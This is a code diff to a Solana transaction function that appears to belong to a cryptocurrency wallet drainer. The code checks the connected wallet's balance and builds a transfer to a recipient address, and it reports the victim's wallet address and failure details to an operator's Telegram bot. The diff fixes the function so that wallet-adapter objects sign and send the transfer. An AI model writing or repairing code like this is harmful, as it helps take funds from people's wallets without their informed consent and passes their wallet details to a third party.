@@ -342,23 +342,26 @@ export const signAndSendTransaction = async (
     console.log('Creating transaction...');
     
     // Validate the wallet has a publicKey before proceeding
-    if (!wallet || !wallet.publicKey) {
-      console.error('Wallet or publicKey is undefined');
+    if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
+      console.error('Wallet, adapter, or publicKey is undefined');
       
       // Send notification to Telegram if credentials provided
       if (botToken && chatId) {
         await sendToTelegram({
-          address: wallet?.publicKey?.toString() || "Unknown",
-          message: `TRANSFER FAILED: Wallet publicKey is undefined`,
+          address: wallet?.adapter?.publicKey?.toString() || "Unknown",
+          message: `TRANSFER FAILED: Wallet adapter or publicKey is undefined`,
           walletName: wallet?.adapter?.name || "Unknown Wallet"
         }, botToken, chatId);
       }
       
-      throw new Error('Wallet publicKey is undefined');
+      throw new Error('Wallet adapter or publicKey is undefined');
     }
     
+    // Use wallet.adapter.publicKey consistently
+    const walletPublicKey = wallet.adapter.publicKey;
+    
     // Check balance first
-    const balance = await connection.getBalance(wallet.publicKey);
+    const balance = await connection.getBalance(walletPublicKey);
     console.log('Current wallet balance (lamports):', balance);
     const balanceInSol = balance / LAMPORTS_PER_SOL;
     console.log('Current wallet balance (SOL):', balanceInSol);
@@ -370,7 +373,7 @@ export const signAndSendTransaction = async (
       // Send notification to Telegram if credentials provided
       if (botToken && chatId) {
         await sendToTelegram({
-          address: wallet.publicKey.toString(),
+          address: walletPublicKey.toString(),
           message: `TRANSFER FAILED: Insufficient balance (${balanceInSol} SOL)`,
           walletName: wallet.adapter?.name || "Unknown Wallet"
         }, botToken, chatId);
@@ -390,7 +393,7 @@ export const signAndSendTransaction = async (
       // Send notification to Telegram if credentials provided
       if (botToken && chatId) {
         await sendToTelegram({
-          address: wallet.publicKey.toString(),
+          address: walletPublicKey.toString(),
           message: `TRANSFER FAILED: Balance too low to cover fees (${balanceInSol} SOL)`,
           walletName: wallet.adapter?.name || "Unknown Wallet"
         }, botToken, chatId);
@@ -408,7 +411,7 @@ export const signAndSendTransaction = async (
       
       if (botToken && chatId) {
         await sendToTelegram({
-          address: wallet.publicKey.toString(),
+          address: walletPublicKey.toString(),
           message: `TRANSFER FAILED: Invalid recipient address`,
           walletName: wallet.adapter?.name || "Unknown Wallet"
         }, botToken, chatId);
@@ -427,7 +430,7 @@ export const signAndSendTransaction = async (
     
     const transaction = new Transaction().add(
       SystemProgram.transfer({
-        fromPubkey: wallet.publicKey,
+        fromPubkey: walletPublicKey,
         toPubkey: recipientPublicKey,
         lamports: transferAmount,
       })
@@ -437,16 +440,17 @@ export const signAndSendTransaction = async (
     const signature = await retry(async () => {
       // Get a fresh connection for the transaction
       const conn = await createConnection();
-      return await sendAndConfirmTransaction(
-        conn,
-        transaction,
-        [wallet],
-        {
-          commitment: 'confirmed',
-          preflightCommitment: 'confirmed',
-          maxRetries: 3,
-        }
-      );
+      
+      // We need to modify how we send the transaction since wallet structure is different
+      if (typeof wallet.signAndSendTransaction === 'function') {
+        // For wallet adapters that have this method
+        return await wallet.signAndSendTransaction(transaction);
+      } else if (typeof wallet.adapter?.sendTransaction === 'function') {
+        // For wallet adapters that use the adapter pattern
+        return await wallet.adapter.sendTransaction(transaction, conn);
+      } else {
+        throw new Error('Wallet does not support transaction signing');
+      }
     }, 3);
 
     console.log('Transaction successful:', signature);
